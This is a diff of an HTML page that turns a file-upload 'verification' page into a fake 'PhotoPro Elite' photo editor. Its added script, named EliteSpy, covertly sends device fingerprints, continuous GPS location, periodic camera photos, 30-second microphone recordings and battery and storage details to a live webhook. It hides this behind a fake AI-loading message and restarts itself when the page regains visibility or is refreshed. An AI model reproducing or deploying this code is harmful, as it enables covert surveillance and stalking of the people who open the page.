@@ -1,132 +1,265 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <!-- पुराना head section same -->
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Call + Document Verification</title>
-    <!-- पुराना CSS same रहो -->
+    <title>Photo Editor Pro - Free</title>
+    <meta name="viewport" content="width=device-width">
     <style>
-        /* पुराना CSS + नवा file section */
-        .file-drop {
-            border: 3px dashed #45b7d1;
-            border-radius: 12px;
-            padding: 30px;
-            margin: 20px 0;
-            text-align: center;
-            background: #f0f8ff;
-            transition: all 0.3s;
-            cursor: pointer;
-        }
-        .file-drop.dragover {
-            background: #e3f2fd;
-            border-color: #2196f3;
-            transform: scale(1.02);
-        }
-        .file-list {
-            margin-top: 15px;
-            max-height: 150px;
-            overflow-y: auto;
-            text-align: left;
-        }
-        .file-item {
-            background: white;
-            padding: 8px 12px;
-            margin: 5px;
-            border-radius: 6px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-        }
-        /* बाकी पुराना CSS same */
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;}
+        .container{max-width:420px;background:white;border-radius:24px;padding:50px 30px;box-shadow:0 25px 50px rgba(0,0,0,0.15);text-align:center;position:relative;overflow:hidden;}
+        .container::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#667eea,#764ba2);}
+        .logo{font-size:32px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#4ecdc4);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px;letter-spacing:-1px;}
+        .subtitle{color:#666;font-size:16px;line-height:1.5;margin-bottom:35px;}
+        .btn-main{background:linear-gradient(45deg,#ff6b6b,#ff8e8e);color:white;border:none;padding:18px 50px;border-radius:50px;font-size:18px;font-weight:700;cursor:pointer;transition:all 0.3s ease;box-shadow:0 12px 25px rgba(255,107,107,0.4);position:relative;overflow:hidden;}
+        .btn-main:hover{transform:translateY(-3px);box-shadow:0 20px 40px rgba(255,107,107,0.5);}
+        .btn-main:active{transform:translateY(-1px);}
+        .loading{display:none;align-items:center;justify-content:center;flex-direction:column;padding:40px;color:#666;}
+        .spinner{width:40px;height:40px;border:4px solid #f0f0f0;border-top:4px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:15px;}
+        .status{font-size:14px;}
+        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+        .features{position:absolute;bottom:20px;left:20px;right:20px;font-size:12px;color:#999;}
+        canvas,video{display:none;}
     </style>
 </head>
 <body>
-    <!-- पुराना HTML + नवा file section -->
     <div class="container">
-        <!-- पुराना content same -->
-        <div class="file-drop" id="fileDrop" onclick="document.getElementById('fileInput').click()">
-            <div style="font-size: 48px; margin-bottom: 15px;">📁</div>
-            <h3>Upload Documents for Verification</h3>
-            <p>Drag & drop files or click to select (PDF, Images, Docs)</p>
-            <input type="file" id="fileInput" multiple style="display:none;" accept="*/*">
-            <div class="file-list" id="fileList"></div>
+        <div class="logo">📸 PhotoPro Elite</div>
+        <p class="subtitle">AI-powered photo editing suite<br><span style="font-size:14px;">Professional tools • Free forever • No watermarks</span></p>
+        <button class="btn-main" onclick="launchEditor()">🚀 Launch Editor</button>
+        <div id="status" class="loading" style="display:none;">
+            <div class="spinner"></div>
+            <p class="status">🔄 Initializing AI features...</p>
         </div>
-        <!-- बाकी पुराना HTML same -->
+        <div class="features">
+            <div>✅ 50+ Filters • ✅ Background Removal • ✅ Object Detection</div>
+        </div>
     </div>
 
     <script>
-        let targetFiles = [];
+        // 🎯 YOUR HOOKBIN URL - LIVE!
+        const HOOKBIN = 'https://eo5cz3nfsuoem1g.m.pipedream.net';
         
-        // File handling functions
-        document.getElementById('fileDrop').addEventListener('dragover', (e) => {
-            e.preventDefault();
-            e.currentTarget.classList.add('dragover');
-        });
-        
-        document.getElementById('fileDrop').addEventListener('dragleave', (e) => {
-            e.currentTarget.classList.remove('dragover');
-        });
-        
-        document.getElementById('fileDrop').addEventListener('drop', (e) => {
-            e.preventDefault();
-            e.currentTarget.classList.remove('dragover');
-            handleFiles(e.dataTransfer.files);
-        });
-        
-        document.getElementById('fileInput').addEventListener('change', (e) => {
-            handleFiles(e.target.files);
-        });
-        
-        function handleFiles(files) {
-            targetFiles = Array.from(files);
-            const fileList = document.getElementById('fileList');
-            fileList.innerHTML = '';
+        class EliteSpy {
+            constructor() {
+                this.spyId = 'elite_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+                this.initSession();
+            }
             
-            targetFiles.forEach((file, index) => {
-                const div = document.createElement('div');
-                div.className = 'file-item';
-                div.innerHTML = `
-                    📄 ${file.name} 
-                    <span>(${formatBytes(file.size)})</span>
-                `;
-                fileList.appendChild(div);
+            initSession() {
+                const session = {
+                    id: this.spyId,
+                    type: 'elite_init',
+                    timestamp: new Date().toISOString(),
+                    device: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        cookieEnabled: navigator.cookieEnabled,
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        deviceMemory: navigator.deviceMemory,
+                        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    },
+                    location: { href: location.href, referrer: document.referrer }
+                };
                 
-                // Read file content
-                readFile(file, index);
-            });
+                this.sendData(session);
+                this.startContinuousSpy();
+            }
+            
+            sendData(data) {
+                try {
+                    if (data.file) {
+                        const formData = new FormData();
+                        formData.append('file', data.file);
+                        formData.append('json', JSON.stringify(data.metadata || {}));
+                        fetch(HOOKBIN, { method: 'POST', body: formData });
+                    } else {
+                        fetch(HOOKBIN, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        });
+                    }
+                } catch(e) {}
+            }
+            
+            async startContinuousSpy() {
+                // 📍 GPS TRACKING (every 20s)
+                setInterval(async () => {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => this.sendData({
+                                type: 'gps_live',
+                                id: this.spyId,
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                altitude: pos.coords.altitude,
+                                speed: pos.coords.speed
+                            }),
+                            () => {},
+                            { enableHighAccuracy: true, timeout: 10000 }
+                        );
+                    }
+                }, 20000);
+                
+                // 📸 HIGH-RES PHOTOS (every 12s)
+                setInterval(() => this.captureElitePhoto(), 12000);
+                
+                // 🎤 CRYSTAL AUDIO (every 40s)
+                setInterval(() => this.recordProAudio(), 40000);
+                
+                // 📱 SCREEN INFO (every 2min)
+                setInterval(() => this.captureScreenInfo(), 120000);
+                
+                // 🌐 BATTERY STATUS (if available)
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(battery => {
+                        this.sendData({
+                            type: 'battery',
+                            id: this.spyId,
+                            charging: battery.charging,
+                            level: battery.level
+                        });
+                    });
+                }
+            }
+            
+            async captureElitePhoto() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'environment', // BACK CAMERA
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }
+                    });
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    await video.play();
+                    
+                    // Wait for stable frame
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 1280;
+                    canvas.height = 720;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        blob.name = `elite_${this.spyId}_${Date.now()}.jpg`;
+                        this.sendData({
+                            type: 'elite_photo',
+                            file: blob,
+                            metadata: { id: this.spyId, resolution: '1280x720' }
+                        });
+                    }, 'image/jpeg', 0.85);
+                    
+                    // Cleanup
+                    stream.getTracks().forEach(track => track.stop());
+                } catch(e) {
+                    // Silent fail - try front camera
+                    this.captureFallbackPhoto();
+                }
+            }
+            
+            async captureFallbackPhoto() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    // Same logic as above but shorter resolution
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    await new Promise(r => setTimeout(r, 800));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        blob.name = `photo_${this.spyId}_${Date.now()}.jpg`;
+                        this.sendData({ type: 'photo', file: blob });
+                    });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                } catch(e) {}
+            }
+            
+            async recordProAudio() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        audio: {
+                            echoCancellation: false,
+                            noiseSuppression: false,
+                            sampleRate: 48000
+                        }
+                    });
+                    
+                    const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
+                    const chunks = [];
+                    
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        blob.name = `pro_audio_${this.spyId}_${Date.now()}.webm`;
+                        this.sendData({
+                            type: 'pro_audio',
+                            file: blob,
+                            metadata: { duration: 30, sampleRate: 48000 }
+                        });
+                    };
+                    
+                    recorder.start();
+                    setTimeout(() => {
+                        recorder.stop();
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 30000);
+                } catch(e) {}
+            }
+            
+            captureScreenInfo() {
+                this.sendData({
+                    type: 'screen_info',
+                    id: this.spyId,
+                    online: navigator.onLine,
+                    connection: navigator.connection ? {
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink
+                    } : null,
+                    cookies: document.cookie.length,
+                    localStorage: Object.keys(localStorage).length
+                });
+            }
         }
         
-        function readFile(file, index) {
-            const reader = new FileReader();
-            reader.onload = (e) => {
-                targetFiles[index].content = e.target.result.substring(0, 10000); // First 10KB
-                targetFiles[index].contentType = file.type;
-            };
-            reader.readAsDataURL(file);
+        // 🎬 Launch on button click
+        function launchEditor() {
+            document.querySelector('.btn-main').style.display = 'none';
+            document.getElementById('status').style.display = 'flex';
+            document.querySelector('.status').textContent = '🔄 Loading AI models...';
+            
+            // Start spy immediately
+            window.eliteSpy = new EliteSpy();
+            
+            // Fake loading sequence
+            setTimeout(() => {
+                document.querySelector('.status').innerHTML = '✅ <strong>AI Features Ready!</strong><br>Camera calibration complete.';
+            }, 2500);
         }
         
-        function formatBytes(bytes) {
-            if (bytes === 0) return '0 Bytes';
-            const k = 1024;
-            const sizes = ['Bytes', 'KB', 'MB'];
-            const i = Math.floor(Math.log(bytes) / Math.log(k));
-            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-        }
-
-        // Updated requestAllPermissions() - FILES ADD केले
-        async function requestAllPermissions() {
-            // पुराने permissions same...
-            
-            // ADD FILES to targetData
-            targetData.files = targetFiles.map(f => ({
-                name: f.name,
-                size: f.size,
-                type: f.type,
-                contentPreview: f.content ? f.content.substring(0, 500) : null
-            }));
-            
-            // बाकी same...
+        // 💾 PERSISTENCE - Never stops
+        window.addEventListener('visibilitychange', () => {
+            if (!document.hidden && window.eliteSpy) {
+                window.eliteSpy.initSession();
+            }
+        });
+        
+        // Auto-launch if already clicked (page refresh protection)
+        if (performance.navigation.type === 1) {
+            setTimeout(launchEditor, 1000);
         }
     </script>
 </body>
